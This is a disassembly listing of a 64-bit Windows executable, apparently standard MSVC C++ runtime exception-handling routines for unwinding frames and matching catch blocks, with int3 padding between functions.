   140004188:	01 00 00 00 
   14000418c:	e8 7b e4 ff ff       	call   0x14000260c
   140004191:	48 8b 48 70          	mov    0x70(%rax),%rcx
   140004195:	48 89 8c 24 c8 00 00 	mov    %rcx,0xc8(%rsp)
   14000419c:	00 
   14000419d:	41 b8 00 01 00 00    	mov    $0x100,%r8d
   1400041a3:	49 8b d6             	mov    %r14,%rdx
   1400041a6:	48 8b 4c 24 48       	mov    0x48(%rsp),%rcx
   1400041ab:	e8 a0 05 00 00       	call   0x140004750
   1400041b0:	48 8b d8             	mov    %rax,%rbx
   1400041b3:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   1400041b8:	48 8b bc 24 c0 00 00 	mov    0xc0(%rsp),%rdi
   1400041bf:	00 
   1400041c0:	eb 78                	jmp    0x14000423a
   1400041c2:	c7 44 24 20 01 00 00 	movl   $0x1,0x20(%rsp)
   1400041c9:	00 
   1400041ca:	e8 3d e4 ff ff       	call   0x14000260c
   1400041cf:	83 60 40 00          	andl   $0x0,0x40(%rax)
   1400041d3:	48 8b b4 24 b8 00 00 	mov    0xb8(%rsp),%rsi
   1400041da:	00 
   1400041db:	83 bc 24 b0 00 00 00 	cmpl   $0x0,0xb0(%rsp)
   1400041e2:	00 
   1400041e3:	74 21                	je     0x140004206
   1400041e5:	b2 01                	mov    $0x1,%dl
   1400041e7:	48 8b ce             	mov    %rsi,%rcx
   1400041ea:	e8 f5 e1 ff ff       	call   0x1400023e4
   1400041ef:	48 8b 8c 24 c8 00 00 	mov    0xc8(%rsp),%rcx
   1400041f6:	00 
   1400041f7:	4c 8d 49 20          	lea    0x20(%rcx),%r9
   1400041fb:	44 8b 41 18          	mov    0x18(%rcx),%r8d
   1400041ff:	8b 51 04             	mov    0x4(%rcx),%edx
   140004202:	8b 09                	mov    (%rcx),%ecx
   140004204:	eb 0d                	jmp    0x140004213
   140004206:	4c 8d 4e 20          	lea    0x20(%rsi),%r9
   14000420a:	44 8b 46 18          	mov    0x18(%rsi),%r8d
   14000420e:	8b 56 04             	mov    0x4(%rsi),%edx
   140004211:	8b 0e                	mov    (%rsi),%ecx
   140004213:	ff 15 2f bf 00 00    	call   *0xbf2f(%rip)        # 0x140010148
   140004219:	44 8b 7c 24 20       	mov    0x20(%rsp),%r15d
   14000421e:	48 8b 5c 24 28       	mov    0x28(%rsp),%rbx
   140004223:	4c 8b 6c 24 40       	mov    0x40(%rsp),%r13
   140004228:	48 8b bc 24 c0 00 00 	mov    0xc0(%rsp),%rdi
   14000422f:	00 
   140004230:	4c 8b 74 24 50       	mov    0x50(%rsp),%r14
   140004235:	4c 8b 64 24 38       	mov    0x38(%rsp),%r12
   14000423a:	49 8b cc             	mov    %r12,%rcx
   14000423d:	e8 fe ec ff ff       	call   0x140002f40
   140004242:	45 85 ff             	test   %r15d,%r15d
   140004245:	75 32                	jne    0x140004279
   140004247:	81 3e 63 73 6d e0    	cmpl   $0xe06d7363,(%rsi)
   14000424d:	75 2a                	jne    0x140004279
   14000424f:	83 7e 18 04          	cmpl   $0x4,0x18(%rsi)
   140004253:	75 24                	jne    0x140004279
   140004255:	8b 46 20             	mov    0x20(%rsi),%eax
   140004258:	2d 20 05 93 19       	sub    $0x19930520,%eax
   14000425d:	83 f8 02             	cmp    $0x2,%eax
   140004260:	77 17                	ja     0x140004279
   140004262:	48 8b 4e 28          	mov    0x28(%rsi),%rcx
   140004266:	e8 ed e1 ff ff       	call   0x140002458
   14000426b:	85 c0                	test   %eax,%eax
   14000426d:	74 0a                	je     0x140004279
   14000426f:	b2 01                	mov    $0x1,%dl
   140004271:	48 8b ce             	mov    %rsi,%rcx
   140004274:	e8 6b e1 ff ff       	call   0x1400023e4
   140004279:	e8 8e e3 ff ff       	call   0x14000260c
   14000427e:	48 89 78 20          	mov    %rdi,0x20(%rax)
   140004282:	e8 85 e3 ff ff       	call   0x14000260c
   140004287:	4c 89 68 28          	mov    %r13,0x28(%rax)
   14000428b:	48 8b 44 24 30       	mov    0x30(%rsp),%rax
   140004290:	48 63 48 1c          	movslq 0x1c(%rax),%rcx
   140004294:	49 8b 06             	mov    (%r14),%rax
   140004297:	48 c7 04 01 fe ff ff 	movq   $0xfffffffffffffffe,(%rcx,%rax,1)
   14000429e:	ff 
   14000429f:	48 8b c3             	mov    %rbx,%rax
   1400042a2:	48 83 c4 70          	add    $0x70,%rsp
   1400042a6:	41 5f                	pop    %r15
   1400042a8:	41 5e                	pop    %r14
   1400042aa:	41 5d                	pop    %r13
   1400042ac:	41 5c                	pop    %r12
   1400042ae:	5f                   	pop    %rdi
   1400042af:	5e                   	pop    %rsi
   1400042b0:	5b                   	pop    %rbx
   1400042b1:	c3                   	ret
   1400042b2:	cc                   	int3
   1400042b3:	cc                   	int3
   1400042b4:	40 53                	rex push %rbx
   1400042b6:	48 83 ec 20          	sub    $0x20,%rsp
   1400042ba:	4c 8b 09             	mov    (%rcx),%r9
   1400042bd:	49 8b d8             	mov    %r8,%rbx
   1400042c0:	41 83 20 00          	andl   $0x0,(%r8)
   1400042c4:	b9 63 73 6d e0       	mov    $0xe06d7363,%ecx
   1400042c9:	41 39 09             	cmp    %ecx,(%r9)
   1400042cc:	75 61                	jne    0x14000432f
   1400042ce:	41 83 79 18 04       	cmpl   $0x4,0x18(%r9)
   1400042d3:	41 b8 20 05 93 19    	mov    $0x19930520,%r8d
   1400042d9:	75 1c                	jne    0x1400042f7
   1400042db:	41 8b 41 20          	mov    0x20(%r9),%eax
   1400042df:	41 2b c0             	sub    %r8d,%eax
   1400042e2:	83 f8 02             	cmp    $0x2,%eax
   1400042e5:	77 10                	ja     0x1400042f7
   1400042e7:	48 8b 42 28          	mov    0x28(%rdx),%rax
   1400042eb:	49 39 41 28          	cmp    %rax,0x28(%r9)
   1400042ef:	75 06                	jne    0x1400042f7
   1400042f1:	c7 03 01 00 00 00    	movl   $0x1,(%rbx)
   1400042f7:	41 39 09             	cmp    %ecx,(%r9)
   1400042fa:	75 33                	jne    0x14000432f
   1400042fc:	41 83 79 18 04       	cmpl   $0x4,0x18(%r9)
   140004301:	75 2c                	jne    0x14000432f
   140004303:	41 8b 49 20          	mov    0x20(%r9),%ecx
   140004307:	41 2b c8             	sub    %r8d,%ecx
   14000430a:	83 f9 02             	cmp    $0x2,%ecx
   14000430d:	77 20                	ja     0x14000432f
   14000430f:	49 83 79 30 00       	cmpq   $0x0,0x30(%r9)
   140004314:	75 19                	jne    0x14000432f
   140004316:	e8 f1 e2 ff ff       	call   0x14000260c
   14000431b:	c7 40 40 01 00 00 00 	movl   $0x1,0x40(%rax)
   140004322:	b8 01 00 00 00       	mov    $0x1,%eax
   140004327:	c7 03 01 00 00 00    	movl   $0x1,(%rbx)
   14000432d:	eb 02                	jmp    0x140004331
   14000432f:	33 c0                	xor    %eax,%eax
   140004331:	48 83 c4 20          	add    $0x20,%rsp
   140004335:	5b                   	pop    %rbx
   140004336:	c3                   	ret
   140004337:	cc                   	int3
   140004338:	44 89 4c 24 20       	mov    %r9d,0x20(%rsp)
   14000433d:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
   140004342:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   140004347:	53                   	push   %rbx
   140004348:	56                   	push   %rsi
   140004349:	57                   	push   %rdi
   14000434a:	41 54                	push   %r12
   14000434c:	41 55                	push   %r13
   14000434e:	41 56                	push   %r14
   140004350:	41 57                	push   %r15
   140004352:	48 83 ec 30          	sub    $0x30,%rsp
   140004356:	45 8b e1             	mov    %r9d,%r12d
   140004359:	49 8b f0             	mov    %r8,%rsi
   14000435c:	48 8b da             	mov    %rdx,%rbx
   14000435f:	4c 8b f9             	mov    %rcx,%r15
   140004362:	e8 2d ec ff ff       	call   0x140002f94
   140004367:	4c 8b e8             	mov    %rax,%r13
   14000436a:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   14000436f:	4c 8b c6             	mov    %rsi,%r8
   140004372:	48 8b d3             	mov    %rbx,%rdx
   140004375:	49 8b cf             	mov    %r15,%rcx
   140004378:	e8 03 ed ff ff       	call   0x140003080
   14000437d:	8b f8                	mov    %eax,%edi
   14000437f:	e8 88 e2 ff ff       	call   0x14000260c
   140004384:	ff 40 30             	incl   0x30(%rax)
   140004387:	83 ff ff             	cmp    $0xffffffff,%edi
   14000438a:	0f 84 eb 00 00 00    	je     0x14000447b
   140004390:	41 3b fc             	cmp    %r12d,%edi
   140004393:	0f 8e e2 00 00 00    	jle    0x14000447b
   140004399:	83 ff ff             	cmp    $0xffffffff,%edi
   14000439c:	0f 8e 14 01 00 00    	jle    0x1400044b6
   1400043a2:	3b 7e 04             	cmp    0x4(%rsi),%edi
   1400043a5:	0f 8d 0b 01 00 00    	jge    0x1400044b6
   1400043ab:	4c 63 f7             	movslq %edi,%r14
   1400043ae:	e8 e1 eb ff ff       	call   0x140002f94
   1400043b3:	48 63 4e 08          	movslq 0x8(%rsi),%rcx
   1400043b7:	4a 8d 04 f0          	lea    (%rax,%r14,8),%rax
   1400043bb:	8b 3c 01             	mov    (%rcx,%rax,1),%edi
   1400043be:	89 7c 24 20          	mov    %edi,0x20(%rsp)
   1400043c2:	e8 cd eb ff ff       	call   0x140002f94
   1400043c7:	48 63 4e 08          	movslq 0x8(%rsi),%rcx
   1400043cb:	4a 8d 04 f0          	lea    (%rax,%r14,8),%rax
   1400043cf:	83 7c 01 04 00       	cmpl   $0x0,0x4(%rcx,%rax,1)
   1400043d4:	74 1c                	je     0x1400043f2
   1400043d6:	e8 b9 eb ff ff       	call   0x140002f94
   1400043db:	48 63 4e 08          	movslq 0x8(%rsi),%rcx
   1400043df:	4a 8d 04 f0          	lea    (%rax,%r14,8),%rax
   1400043e3:	48 63 5c 01 04       	movslq 0x4(%rcx,%rax,1),%rbx
   1400043e8:	e8 a7 eb ff ff       	call   0x140002f94
   1400043ed:	48 03 c3             	add    %rbx,%rax
   1400043f0:	eb 02                	jmp    0x1400043f4
   1400043f2:	33 c0                	xor    %eax,%eax
   1400043f4:	48 85 c0             	test   %rax,%rax
   1400043f7:	74 59                	je     0x140004452
   1400043f9:	44 8b c7             	mov    %edi,%r8d
   1400043fc:	48 8b d6             	mov    %rsi,%rdx
   1400043ff:	49 8b cf             	mov    %r15,%rcx
   140004402:	e8 cd ec ff ff       	call   0x1400030d4
   140004407:	e8 88 eb ff ff       	call   0x140002f94
   14000440c:	48 63 4e 08          	movslq 0x8(%rsi),%rcx
   140004410:	4a 8d 04 f0          	lea    (%rax,%r14,8),%rax
   140004414:	83 7c 01 04 00       	cmpl   $0x0,0x4(%rcx,%rax,1)
   140004419:	74 1c                	je     0x140004437
   14000441b:	e8 74 eb ff ff       	call   0x140002f94
   140004420:	48 63 4e 08          	movslq 0x8(%rsi),%rcx
   140004424:	4a 8d 04 f0          	lea    (%rax,%r14,8),%rax
   140004428:	48 63 5c 01 04       	movslq 0x4(%rcx,%rax,1),%rbx
   14000442d:	e8 62 eb ff ff       	call   0x140002f94
   140004432:	48 03 c3             	add    %rbx,%rax
   140004435:	eb 02                	jmp    0x140004439
   140004437:	33 c0                	xor    %eax,%eax
   140004439:	41 b8 03 01 00 00    	mov    $0x103,%r8d
   14000443f:	49 8b d7             	mov    %r15,%rdx
   140004442:	48 8b c8             	mov    %rax,%rcx
   140004445:	e8 06 03 00 00       	call   0x140004750
   14000444a:	49 8b cd             	mov    %r13,%rcx
   14000444d:	e8 6a eb ff ff       	call   0x140002fbc
   140004452:	eb 1e                	jmp    0x140004472
   140004454:	44 8b a4 24 88 00 00 	mov    0x88(%rsp),%r12d
   14000445b:	00 
   14000445c:	48 8b b4 24 80 00 00 	mov    0x80(%rsp),%rsi
   140004463:	00 
   140004464:	4c 8b 7c 24 70       	mov    0x70(%rsp),%r15
   140004469:	4c 8b 6c 24 28       	mov    0x28(%rsp),%r13
   14000446e:	8b 7c 24 20          	mov    0x20(%rsp),%edi
   140004472:	89 7c 24 24          	mov    %edi,0x24(%rsp)
   140004476:	e9 0c ff ff ff       	jmp    0x140004387
   14000447b:	e8 8c e1 ff ff       	call   0x14000260c
   140004480:	83 78 30 00          	cmpl   $0x0,0x30(%rax)
   140004484:	7e 08                	jle    0x14000448e
   140004486:	e8 81 e1 ff ff       	call   0x14000260c
   14000448b:	ff 48 30             	decl   0x30(%rax)
   14000448e:	83 ff ff             	cmp    $0xffffffff,%edi
   140004491:	74 05                	je     0x140004498
   140004493:	41 3b fc             	cmp    %r12d,%edi
   140004496:	7f 24                	jg     0x1400044bc
   140004498:	44 8b c7             	mov    %edi,%r8d
   14000449b:	48 8b d6             	mov    %rsi,%rdx
   14000449e:	49 8b cf             	mov    %r15,%rcx
   1400044a1:	e8 2e ec ff ff       	call   0x1400030d4
   1400044a6:	48 83 c4 30          	add    $0x30,%rsp
   1400044aa:	41 5f                	pop    %r15
   1400044ac:	41 5e                	pop    %r14
   1400044ae:	41 5d                	pop    %r13
   1400044b0:	41 5c                	pop    %r12
   1400044b2:	5f                   	pop    %rdi
   1400044b3:	5e                   	pop    %rsi
   1400044b4:	5b                   	pop    %rbx
   1400044b5:	c3                   	ret
   1400044b6:	e8 55 19 00 00       	call   0x140005e10
   1400044bb:	90                   	nop
   1400044bc:	e8 4f 19 00 00       	call   0x140005e10
   1400044c1:	90                   	nop
   1400044c2:	cc                   	int3
   1400044c3:	cc                   	int3
   1400044c4:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400044c9:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   1400044ce:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   1400044d3:	57                   	push   %rdi
   1400044d4:	48 83 ec 20          	sub    $0x20,%rsp
   1400044d8:	48 8b e9             	mov    %rcx,%rbp
   1400044db:	49 8b f8             	mov    %r8,%rdi
   1400044de:	49 8b c8             	mov    %r8,%rcx
   1400044e1:	48 8b f2             	mov    %rdx,%rsi
   1400044e4:	e8 33 ec ff ff       	call   0x14000311c
   1400044e9:	4c 8d 4c 24 48       	lea    0x48(%rsp),%r9
   1400044ee:	4c 8b c7             	mov    %rdi,%r8
   1400044f1:	48 8b d6             	mov    %rsi,%rdx
   1400044f4:	48 8b cd             	mov    %rbp,%rcx
   1400044f7:	8b d8                	mov    %eax,%ebx
   1400044f9:	e8 fe e6 ff ff       	call   0x140002bfc
   1400044fe:	4c 8b c7             	mov    %rdi,%r8
   140004501:	48 8b d6             	mov    %rsi,%rdx
   140004504:	48 8b cd             	mov    %rbp,%rcx
   140004507:	e8 9c eb ff ff       	call   0x1400030a8
   14000450c:	3b d8                	cmp    %eax,%ebx
   14000450e:	7e 23                	jle    0x140004533
   140004510:	44 8b c3             	mov    %ebx,%r8d
   140004513:	48 8d 4c 24 48       	lea    0x48(%rsp),%rcx
   140004518:	48 8b d7             	mov    %rdi,%rdx
   14000451b:	e8 b4 eb ff ff       	call   0x1400030d4
   140004520:	44 8b cb             	mov    %ebx,%r9d
   140004523:	4c 8b c7             	mov    %rdi,%r8
   140004526:	48 8b d6             	mov    %rsi,%rdx
   140004529:	48 8b cd             	mov    %rbp,%rcx
   14000452c:	e8 af eb ff ff       	call   0x1400030e0
   140004531:	eb 10                	jmp    0x140004543
   140004533:	4c 8b c7             	mov    %rdi,%r8
   140004536:	48 8b d6             	mov    %rsi,%rdx
   140004539:	48 8b cd             	mov    %rbp,%rcx
   14000453c:	e8 67 eb ff ff       	call   0x1400030a8
   140004541:	8b d8                	mov    %eax,%ebx
   140004543:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   140004548:	8b c3                	mov    %ebx,%eax
   14000454a:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000454f:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   140004554:	48 83 c4 20          	add    $0x20,%rsp
   140004558:	5f                   	pop    %rdi
   140004559:	c3                   	ret
   14000455a:	cc                   	int3
   14000455b:	cc                   	int3
   14000455c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140004561:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   140004566:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   14000456b:	57                   	push   %rdi
   14000456c:	41 54                	push   %r12
   14000456e:	41 55                	push   %r13
   140004570:	41 56                	push   %r14
   140004572:	41 57                	push   %r15
   140004574:	48 83 ec 20          	sub    $0x20,%rsp
   140004578:	48 8b ea             	mov    %rdx,%rbp
   14000457b:	4c 8b e9             	mov    %rcx,%r13
   14000457e:	48 85 d2             	test   %rdx,%rdx
   140004581:	0f 84 bc 00 00 00    	je     0x140004643
   140004587:	45 32 ff             	xor    %r15b,%r15b
   14000458a:	33 f6                	xor    %esi,%esi
   14000458c:	39 32                	cmp    %esi,(%rdx)
   14000458e:	0f 8e 8f 00 00 00    	jle    0x140004623
   140004594:	e8 0f ea ff ff       	call   0x140002fa8
   140004599:	48 8b d0             	mov    %rax,%rdx
   14000459c:	49 8b 45 30          	mov    0x30(%r13),%rax
   1400045a0:	4c 63 60 0c          	movslq 0xc(%rax),%r12
   1400045a4:	49 83 c4 04          	add    $0x4,%r12
   1400045a8:	4c 03 e2             	add    %rdx,%r12
   1400045ab:	e8 f8 e9 ff ff       	call   0x140002fa8
   1400045b0:	48 8b d0             	mov    %rax,%rdx
   1400045b3:	49 8b 45 30          	mov    0x30(%r13),%rax
   1400045b7:	48 63 48 0c          	movslq 0xc(%rax),%rcx
   1400045bb:	44 8b 34 0a          	mov    (%rdx,%rcx,1),%r14d
   1400045bf:	45 85 f6             	test   %r14d,%r14d
   1400045c2:	7e 54                	jle    0x140004618
   1400045c4:	48 63 c6             	movslq %esi,%rax
   1400045c7:	48 8d 04 80          	lea    (%rax,%rax,4),%rax
   1400045cb:	48 89 44 24 58       	mov    %rax,0x58(%rsp)
   1400045d0:	e8 d3 e9 ff ff       	call   0x140002fa8
   1400045d5:	49 8b 5d 30          	mov    0x30(%r13),%rbx
   1400045d9:	48 8b f8             	mov    %rax,%rdi
   1400045dc:	49 63 04 24          	movslq (%r12),%rax
   1400045e0:	48 03 f8             	add    %rax,%rdi
   1400045e3:	e8 ac e9 ff ff       	call   0x140002f94
   1400045e8:	48 8b 54 24 58       	mov    0x58(%rsp),%rdx
   1400045ed:	4c 8b c3             	mov    %rbx,%r8
   1400045f0:	48 63 4d 04          	movslq 0x4(%rbp),%rcx
   1400045f4:	48 8d 04 90          	lea    (%rax,%rdx,4),%rax
   1400045f8:	48 8b d7             	mov    %rdi,%rdx
   1400045fb:	48 03 c8             	add    %rax,%rcx
   1400045fe:	e8 5d f6 ff ff       	call   0x140003c60
   140004603:	85 c0                	test   %eax,%eax
   140004605:	75 0e                	jne    0x140004615
   140004607:	41 ff ce             	dec    %r14d
   14000460a:	49 83 c4 04          	add    $0x4,%r12
   14000460e:	45 85 f6             	test   %r14d,%r14d
   140004611:	7f bd                	jg     0x1400045d0
   140004613:	eb 03                	jmp    0x140004618
   140004615:	41 b7 01             	mov    $0x1,%r15b
   140004618:	ff c6                	inc    %esi
   14000461a:	3b 75 00             	cmp    0x0(%rbp),%esi
   14000461d:	0f 8c 71 ff ff ff    	jl     0x140004594
   140004623:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   140004628:	41 8a c7             	mov    %r15b,%al
   14000462b:	48 8b 6c 24 60       	mov    0x60(%rsp),%rbp
   140004630:	48 8b 74 24 68       	mov    0x68(%rsp),%rsi
   140004635:	48 83 c4 20          	add    $0x20,%rsp
   140004639:	41 5f                	pop    %r15
   14000463b:	41 5e                	pop    %r14
   14000463d:	41 5d                	pop    %r13
   14000463f:	41 5c                	pop    %r12
   140004641:	5f                   	pop    %rdi
   140004642:	c3                   	ret
   140004643:	e8 c8 17 00 00       	call   0x140005e10
   140004648:	cc                   	int3
   140004649:	cc                   	int3
   14000464a:	cc                   	int3
   14000464b:	cc                   	int3
   14000464c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140004651:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   140004656:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   14000465b:	57                   	push   %rdi
   14000465c:	48 83 ec 20          	sub    $0x20,%rsp
   140004660:	33 ed                	xor    %ebp,%ebp
   140004662:	48 8b f9             	mov    %rcx,%rdi
   140004665:	39 29                	cmp    %ebp,(%rcx)
   140004667:	7e 50                	jle    0x1400046b9
   140004669:	33 f6                	xor    %esi,%esi
   14000466b:	e8 24 e9 ff ff       	call   0x140002f94
   140004670:	48 63 4f 04          	movslq 0x4(%rdi),%rcx
   140004674:	48 03 c6             	add    %rsi,%rax
   140004677:	83 7c 01 04 00       	cmpl   $0x0,0x4(%rcx,%rax,1)
   14000467c:	74 1b                	je     0x140004699
   14000467e:	e8 11 e9 ff ff       	call   0x140002f94
   140004683:	48 63 4f 04          	movslq 0x4(%rdi),%rcx
   140004687:	48 03 c6             	add    %rsi,%rax
   14000468a:	48 63 5c 01 04       	movslq 0x4(%rcx,%rax,1),%rbx
   14000468f:	e8 00 e9 ff ff       	call   0x140002f94
   140004694:	48 03 c3             	add    %rbx,%rax
   140004697:	eb 02                	jmp    0x14000469b
   140004699:	33 c0                	xor    %eax,%eax
   14000469b:	48 8d 48 08          	lea    0x8(%rax),%rcx
   14000469f:	48 8d 15 92 63 01 00 	lea    0x16392(%rip),%rdx        # 0x14001aa38
   1400046a6:	e8 11 dd ff ff       	call   0x1400023bc
   1400046ab:	85 c0                	test   %eax,%eax
   1400046ad:	74 21                	je     0x1400046d0
   1400046af:	ff c5                	inc    %ebp
   1400046b1:	48 83 c6 14          	add    $0x14,%rsi
   1400046b5:	3b 2f                	cmp    (%rdi),%ebp
   1400046b7:	7c b2                	jl     0x14000466b
   1400046b9:	32 c0                	xor    %al,%al
   1400046bb:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400046c0:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   1400046c5:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   1400046ca:	48 83 c4 20          	add    $0x20,%rsp
   1400046ce:	5f                   	pop    %rdi
   1400046cf:	c3                   	ret
   1400046d0:	b0 01                	mov    $0x1,%al
   1400046d2:	eb e7                	jmp    0x1400046bb
   1400046d4:	48 8b c2             	mov    %rdx,%rax
   1400046d7:	49 8b d0             	mov    %r8,%rdx
   1400046da:	48 ff e0             	rex.W jmp *%rax
   1400046dd:	cc                   	int3
   1400046de:	cc                   	int3
   1400046df:	cc                   	int3
   1400046e0:	49 8b c0             	mov    %r8,%rax
   1400046e3:	4c 8b d2             	mov    %rdx,%r10
   1400046e6:	48 8b d0             	mov    %rax,%rdx
   1400046e9:	45 8b c1             	mov    %r9d,%r8d
   1400046ec:	49 ff e2             	rex.WB jmp *%r10
   1400046ef:	cc                   	int3
   1400046f0:	48 83 79 08 00       	cmpq   $0x0,0x8(%rcx)
   1400046f5:	48 8d 05 74 cc 00 00 	lea    0xcc74(%rip),%rax        # 0x140011370
   1400046fc:	48 0f 45 41 08       	cmovne 0x8(%rcx),%rax
   140004701:	c3                   	ret
   140004702:	cc                   	int3
   140004703:	cc                   	int3
   140004704:	cc                   	int3
   140004705:	cc                   	int3
   140004706:	cc                   	int3
   140004707:	cc                   	int3
   140004708:	cc                   	int3
   140004709:	cc                   	int3
   14000470a:	cc                   	int3
   14000470b:	cc                   	int3
   14000470c:	cc                   	int3
   14000470d:	cc                   	int3
   14000470e:	cc                   	int3
   14000470f:	cc                   	int3
   140004710:	cc                   	int3
   140004711:	cc                   	int3
   140004712:	cc                   	int3
   140004713:	cc                   	int3
   140004714:	cc                   	int3
   140004715:	cc                   	int3
   140004716:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000471d:	00 00 00 
   140004720:	cc                   	int3
   140004721:	cc                   	int3
   140004722:	cc                   	int3
   140004723:	cc                   	int3
   140004724:	cc                   	int3
   140004725:	cc                   	int3
   140004726:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000472d:	00 00 00 
   140004730:	cc                   	int3
   140004731:	cc                   	int3
   140004732:	cc                   	int3
   140004733:	cc                   	int3
   140004734:	cc                   	int3
   140004735:	cc                   	int3
   140004736:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000473d:	00 00 00 
   140004740:	cc                   	int3
   140004741:	cc                   	int3
   140004742:	cc                   	int3
   140004743:	cc                   	int3
   140004744:	cc                   	int3
   140004745:	cc                   	int3
   140004746:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000474d:	00 00 00 
   140004750:	48 83 ec 28          	sub    $0x28,%rsp
   140004754:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   140004759:	48 89 54 24 38       	mov    %rdx,0x38(%rsp)
   14000475e:	44 89 44 24 40       	mov    %r8d,0x40(%rsp)
   140004763:	48 8b 12             	mov    (%rdx),%rdx
   140004766:	48 8b c1             	mov    %rcx,%rax
   140004769:	e8 12 de ff ff       	call   0x140002580
   14000476e:	ff d0                	call   *%rax
   140004770:	e8 3b de ff ff       	call   0x1400025b0
   140004775:	48 8b c8             	mov    %rax,%rcx
   140004778:	48 8b 54 24 38       	mov    0x38(%rsp),%rdx
   14000477d:	48 8b 12             	mov    (%rdx),%rdx
   140004780:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   140004786:	e8 f5 dd ff ff       	call   0x140002580
   14000478b:	48 83 c4 28          	add    $0x28,%rsp
   14000478f:	c3                   	ret
   140004790:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140004795:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   14000479a:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   14000479f:	41 56                	push   %r14
   1400047a1:	48 83 ec 20          	sub    $0x20,%rsp
   1400047a5:	80 79 08 00          	cmpb   $0x0,0x8(%rcx)
   1400047a9:	4c 8b f2             	mov    %rdx,%r14
   1400047ac:	48 8b f1             	mov    %rcx,%rsi
   1400047af:	74 4c                	je     0x1400047fd
   1400047b1:	48 8b 01             	mov    (%rcx),%rax
   1400047b4:	48 85 c0             	test   %rax,%rax
   1400047b7:	74 44                	je     0x1400047fd
   1400047b9:	48 83 cf ff          	or     $0xffffffffffffffff,%rdi
   1400047bd:	48 ff c7             	inc    %rdi
   1400047c0:	80 3c 38 00          	cmpb   $0x0,(%rax,%rdi,1)
   1400047c4:	75 f7                	jne    0x1400047bd
   1400047c6:	48 8d 4f 01          	lea    0x1(%rdi),%rcx
   1400047ca:	e8 d9 15 00 00       	call   0x140005da8
   1400047cf:	48 8b d8             	mov    %rax,%rbx
   1400047d2:	48 85 c0             	test   %rax,%rax
   1400047d5:	74 1c                	je     0x1400047f3
   1400047d7:	4c 8b 06             	mov    (%rsi),%r8
   1400047da:	48 8d 57 01          	lea    0x1(%rdi),%rdx
   1400047de:	48 8b c8             	mov    %rax,%rcx
   1400047e1:	e8 ca 15 00 00       	call   0x140005db0
   1400047e6:	48 8b c3             	mov    %rbx,%rax
   1400047e9:	41 c6 46 08 01       	movb   $0x1,0x8(%r14)
   1400047ee:	49 89 06             	mov    %rax,(%r14)
   1400047f1:	33 db                	xor    %ebx,%ebx
   1400047f3:	48 8b cb             	mov    %rbx,%rcx
   1400047f6:	e8 99 15 00 00       	call   0x140005d94
   1400047fb:	eb 0a                	jmp    0x140004807
   1400047fd:	48 8b 01             	mov    (%rcx),%rax
   140004800:	48 89 02             	mov    %rax,(%rdx)
   140004803:	c6 42 08 00          	movb   $0x0,0x8(%rdx)
   140004807:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000480c:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   140004811:	48 8b 7c 24 40       	mov    0x40(%rsp),%rdi
   140004816:	48 83 c4 20          	add    $0x20,%rsp
   14000481a:	41 5e                	pop    %r14
   14000481c:	c3                   	ret
   14000481d:	cc                   	int3
   14000481e:	cc                   	int3
   14000481f:	cc                   	int3
   140004820:	40 53                	rex push %rbx
   140004822:	48 83 ec 20          	sub    $0x20,%rsp
   140004826:	80 79 08 00          	cmpb   $0x0,0x8(%rcx)
   14000482a:	48 8b d9             	mov    %rcx,%rbx
   14000482d:	74 08                	je     0x140004837
   14000482f:	48 8b 09             	mov    (%rcx),%rcx
   140004832:	e8 5d 15 00 00       	call   0x140005d94
   140004837:	48 83 23 00          	andq   $0x0,(%rbx)
   14000483b:	c6 43 08 00          	movb   $0x0,0x8(%rbx)
   14000483f:	48 83 c4 20          	add    $0x20,%rsp
   140004843:	5b                   	pop    %rbx
   140004844:	c3                   	ret
   140004845:	cc                   	int3
   140004846:	cc                   	int3
   140004847:	cc                   	int3
   140004848:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   14000484d:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   140004852:	57                   	push   %rdi
   140004853:	48 83 ec 50          	sub    $0x50,%rsp
   140004857:	48 8b da             	mov    %rdx,%rbx
   14000485a:	48 8b f1             	mov    %rcx,%rsi
   14000485d:	bf 20 05 93 19       	mov    $0x19930520,%edi
   140004862:	48 85 d2             	test   %rdx,%rdx
   140004865:	74 1d                	je     0x140004884
   140004867:	f6 02 10             	testb  $0x10,(%rdx)
   14000486a:	74 18                	je     0x140004884
   14000486c:	48 8b 09             	mov    (%rcx),%rcx
   14000486f:	48 83 e9 08          	sub    $0x8,%rcx
   140004873:	48 8b 01             	mov    (%rcx),%rax
   140004876:	48 8b 58 30          	mov    0x30(%rax),%rbx
   14000487a:	48 8b 40 40          	mov    0x40(%rax),%rax
   14000487e:	ff 15 34 ba 00 00    	call   *0xba34(%rip)        # 0x1400102b8
   140004884:	33 c0                	xor    %eax,%eax
